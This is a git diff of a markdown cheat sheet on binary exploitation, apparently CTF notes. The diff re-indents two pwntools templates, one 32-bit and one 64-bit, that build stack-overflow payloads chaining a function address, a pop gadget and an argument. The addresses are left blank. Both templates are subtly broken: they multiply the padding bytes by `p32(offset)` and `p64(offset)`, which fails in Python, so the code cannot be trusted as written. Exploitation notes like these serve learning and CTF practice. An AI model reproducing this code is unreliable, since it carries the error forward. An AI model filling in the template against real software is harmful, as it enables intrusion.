@@ -75,22 +75,22 @@ ___________________
 #### Application:
 * 32-bit:
     ```python
-        from pwn import *
-        offset = 44 # it's usually 44, but it might not be
-        function_address = ___
-        pop_address = ___
-        argument = ___
-        inject = b"a" * p32(offset) + p32(function_address) + p32(pop_address) + p32(argument)
+    from pwn import *
+    offset = 44 # it's usually 44, but it might not be
+    function_address = ___
+    pop_address = ___
+    argument = ___
+    inject = b"a" * p32(offset) + p32(function_address) + p32(pop_address) + p32(argument)
     ```
 * 64-bit:
     ```python
-        from pwn import *
-        offset = 40 # it's usually 40, but it might not be
-        function_address = ___
-        pop_address = ___
-        argument = ___
-        inject = b"a" * p64(offset) + p64(pop_address) + p64(argument) + p64(function_address)
-       ```
+    from pwn import *
+    offset = 40 # it's usually 40, but it might not be
+    function_address = ___
+    pop_address = ___
+    argument = ___
+    inject = b"a" * p64(offset) + p64(pop_address) + p64(argument) + p64(function_address)
+    ```
 ## GOT PLT Linking & Exploiting
 _________
 All relevant instructions and the order to use them in:
